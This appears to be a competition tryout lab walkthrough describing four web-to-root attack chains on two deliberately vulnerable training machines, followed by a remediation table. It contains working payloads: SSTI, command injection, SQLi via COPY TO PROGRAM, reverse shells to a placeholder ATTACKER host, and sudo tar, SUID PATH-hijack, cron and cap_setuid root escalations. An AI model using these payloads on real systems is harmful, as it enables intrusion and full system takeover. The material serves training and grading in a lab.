# Web-to-Root Attack Routes — CPTC 2026 Tryout

Two target machines, each hosting two vulnerable web apps. For each machine there
are **two full routes** from the web all the way to **root**: a web vulnerability
gives a shell on the host as a service account, then a local misconfiguration
(planted by `./linux-tryout-setup.sh`) escalates to root.

- **Diagram:** `attack-flow.drawio.xml` (open at diagrams.net or with the VS Code
  Draw.io extension). Left column = the generic kill-chain example; each other
  column = one route.
- **Priv-esc setup:** run `sudo ./linux-tryout-setup.sh <machine> --privesc` on
  each host (see that folder's README). All four escalation vectors below were
  tested end-to-end and confirmed to yield a root shell (`uid=0`).

| Machine | Apps | Route | Web foothold | Escalation vector |
|---------|------|-------|--------------|-------------------|
| **rocky** | Antimatter-Weapons, Bubble-Control | R1 | Werkzeug debug console (debug=True) | sudo NOPASSWD `tar` (GTFOBins) |
| | | R2 | OS command injection (`shell=True`) | SUID `system()` PATH hijack |
| **hail mary** | HR-Portal, Wormhole Casino | H1 | Jinja2 SSTI (`render_template_string`) | root cron runs a group-writable script |
| | | H2 | SQLi → PostgreSQL `COPY … TO PROGRAM` | `cap_setuid` on an interpreter |

> Deployment note: run each Flask app as the service user shown below
> (`svc-antimatter`, `svc-bubble`, `svc-hr`) so the web RCE lands as that user.
> Run the Wormhole Casino site with `node build` as `svc-casino` **plus a local PostgreSQL** whose app
> role (`wormhole`) is a superuser — the SQLi RCE executes as the host `postgres`
> user, which then abuses the world-usable `cap_setuid` binary.

---

# MACHINE: rocky

Hosts **Antimatter-Weapons** and **Bubble-Control** (both Flask, `debug=True`,
bound `0.0.0.0:5000`). `sudo ./linux-tryout-setup.sh rocky --privesc` creates
`svc-antimatter` and `svc-bubble` and plants vectors A and B.

## Route R1 — Antimatter-Weapons → sudo `tar`

**Web app vulns (Antimatter-Weapons)** — `app.py`:
- Hardcoded `secret_key = "wormhole-antimatter-targeting-2049"` (`app.py:10`) → session forgery.
- Broken auth on `/admin`: `?admin=1`, `Cookie: role=admin`, or `clearance=OMEGA` all bypass (`app.py:375-382`); dumps operator creds + AWS/reactor/warhead secrets.
- `debug=True` (`app.py:418`) → Werkzeug interactive debugger.
- Unauthenticated 500 in `/api/launch` via `int()`/`float()` casts (`app.py:319-325`).
- Plaintext creds, unauth info-disclosure APIs, feed XSS (`static/js/payloads.js:176-183`).

**Chain:**
1. **Recon:** `GET /robots.txt` → `/static/notes.txt` reveals the `/admin?admin=1` backdoor. `GET /admin?admin=1` harvests `commander:commander` and reusable secrets.
2. **Foothold (RCE):** trigger the debugger with an unauthenticated type-cast crash, then run Python in the console (PIN is printed to the app's stdout/log on start, or derivable):
   ```bash
   curl -X POST http://rocky:5000/api/launch -H 'Content-Type: application/json' \
        -d '{"target_id":"pwn","payload_id":1,"coord_x":0,"coord_y":0}'
   # open the traceback → console frame → :
   __import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"')
   ```
   → shell as **svc-antimatter**.
3. **Enumerate:** `sudo -l` →
   ```
   (root) NOPASSWD: /usr/bin/tar
   ```
4. **Escalate (vector A):** GTFOBins `tar`:
   ```bash
   sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
   # id → uid=0(root)
   ```

## Route R2 — Bubble-Control → SUID PATH hijack

**Web app vulns (Bubble-Control)** — `app.py`:
- OS command injection in `/api/status-check?host=` (`app.py:152-161`, `subprocess.run(..., shell=True)`), output reflected.
- Weak creds `admin/admin`, `guest/guest`, `operator/password123` (`app.py:15`); no lockout.
- Hardcoded `secret_key = "bubble_ctrl_2049"` (`app.py:12`) → forgeable sessions.
- Unauth `/admin?admin=true` dumps DB/AWS/SMTP secrets; DB password leaked via `/api/logs`.

**Chain:**
1. **Access:** log in with `guest/guest`, or forge the session cookie offline with the leaked secret `bubble_ctrl_2049`.
2. **Foothold (RCE):** command injection (output is reflected, non-blind):
   ```bash
   curl -s -c c.txt -d 'username=guest&password=guest' http://rocky:5000/login >/dev/null
   curl -s -b c.txt 'http://rocky:5000/api/status-check?host=127.0.0.1%3Bid'      # proof
   # reverse shell: host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
   ```
   → shell as **svc-bubble**.
3. **Enumerate:** `find / -perm -4000 -type f 2>/dev/null` → `/usr/local/bin/bubble-diag` (SUID root). `strings bubble-diag` shows it calls `ps`, `grep`, `cat` by **relative name** after `setuid(0)`.
4. **Escalate (vector B):** shadow one of those commands in `PATH`. `cat` is unpiped, so hijacking it gives a clean root context:
   ```bash
   mkdir -p /tmp/.x
   printf '#!/bin/bash\ncp /bin/bash /tmp/.x/rb; chmod 4755 /tmp/.x/rb\n' > /tmp/.x/cat
   chmod +x /tmp/.x/cat
   PATH=/tmp/.x:$PATH /usr/local/bin/bubble-diag      # runs our 'cat' as root
   /tmp/.x/rb -p -c 'id'          # euid=0(root)
   ```

---

# MACHINE: hail mary

Hosts **HR-Portal** (Flask, SSTI) and **wormhole-casino-website** (SvelteKit +
PostgreSQL). `sudo ./linux-tryout-setup.sh hailmary --privesc` creates `svc-hr`/`svc-casino`
and plants vectors C (cap_setuid) and D (writable cron).

## Route H1 — HR-Portal → writable root cron

**Web app vulns (HR-Portal)** — `app.py`:
- Jinja2 SSTI: `render_template_string(template, ...)` on user input (`app.py:207`, route `POST /profile/greeting`).
- SQLi login (f-string query, `app.py:91-96`) → `admin'-- ` bypass + verbose errors.
- Broken `/admin*` access control (`?admin=1` / cookie, no `@login_required`, `app.py:307-314`).
- Path-traversal file read `/documents/view?file=` (`app.py:225-241`); unrestricted upload (`app.py:283-284`); SSRF `/admin/fetch`; stored XSS; IDOR PII API with `CORS: *`; hardcoded `secret_key`.

**Chain:**
1. **Access:** log in (SQLi `username=admin'-- ` or seeded `awong/Password1!`).
2. **Foothold (RCE):** SSTI:
   ```bash
   curl -s -c c.txt -d 'username=awong&password=Password1!' http://hailmary:5000/login >/dev/null
   curl -s -b c.txt -X POST http://hailmary:5000/profile/greeting \
        --data-urlencode "template={{ cycler.__init__.__globals__.os.popen('id').read() }}"
   # swap in a reverse-shell command for a shell
   ```
   → shell as **svc-hr**.
3. **Enumerate:** inspect cron (`cat /etc/cron.d/*`, or run `pspy`) →
   ```
   * * * * * root /opt/hailmary/tasks/hr-nightly.sh
   ```
   `ls -l` shows it is **group-writable by `svc-hr`** (`-rwxrwxr-x root svc-hr`).
4. **Escalate (vector D):** append a payload; root runs it on the next minute:
   ```bash
   echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> /opt/hailmary/tasks/hr-nightly.sh
   # wait up to 60s, then:
   /tmp/rb -p -c 'id'
   ```

## Route H2 — Wormhole Casino → `cap_setuid`

**Web app vulns (Wormhole Casino)** — SvelteKit + Prisma + `pg`:
- SQL injection via raw `pgPool.query()` at `/login` (`src/routes/login/+page.server.ts:20-29`) and `/search` — simple-query protocol allows **stacked statements**; the `wormhole` DB role is a **superuser**.
- XXE arbitrary file read at `POST /api/import-booking` (`src/lib/server/xml.ts:28-39`) — read `keys/primary.pem`, `/proc/self/environ`, etc.
- JWT `kid` key-confusion (`src/lib/server/jwt.ts:26-35`) → forge admin after leaking the key via XXE.
- Static staff PIN `2287`; host-header reset poisoning; `csrf.checkOrigin` disabled; committed DB creds `wormhole:supernova`.

**Chain:**
1. **Foothold (RCE):** unauthenticated SQLi → PostgreSQL `COPY … TO PROGRAM` (single request):
   ```bash
   curl -s http://hailmary:6767/login -H 'Content-Type: application/x-www-form-urlencoded' \
     --data-urlencode "email=x'; COPY (SELECT '') TO PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f'; --" \
     --data-urlencode 'password=x'
   ```
   → command execution as **postgres** on hail mary.
   *(Complementary: XXE reads `keys/primary.pem` → forge an admin JWT for `/admin`, which dumps all password hashes + PII.)*
2. **Enumerate:** `getcap -r / 2>/dev/null` →
   ```
   /opt/hailmary/bin/casino-report cap_setuid+ep
   ```
   a world-executable copy of Python carrying `CAP_SETUID`.
3. **Escalate (vector C):**
   ```bash
   /opt/hailmary/bin/casino-report -c 'import os; os.setuid(0); os.system("/bin/bash")'
   # id → uid=0(root)
   ```

---

## Remediation (grading reference)

| # | Root cause | Fix |
|---|-----------|-----|
| Antimatter | `debug=True` in prod → Werkzeug console; broken `/admin`; hardcoded key | `debug=False`; gate `/admin` server-side; load secrets from env |
| Bubble | `subprocess.run(shell=True)` with user input | pass an argv list, validate `host`; no `shell=True` |
| HR-Portal | `render_template_string` on user input | never template user input; use static templates + context vars |
| Wormhole Casino | raw string SQL + superuser DB role + simple-query stacking | parameterized queries; least-privilege DB role; disable `COPY…PROGRAM` |
| Vector A | NOPASSWD sudo on a GTFOBins binary (`tar`) | remove; if backups need root, use a fixed locked-down wrapper |
| Vector B | SUID binary calls helpers by relative name | call absolute paths, scrub `PATH`, drop the SUID bit |
| Vector C | `cap_setuid` on a general-purpose interpreter | remove the cap (`setcap -r`); use a fixed-UID compiled helper |
| Vector D | root cron runs a script writable by a low-priv group | make the script root-owned, mode 700, not group-writable |
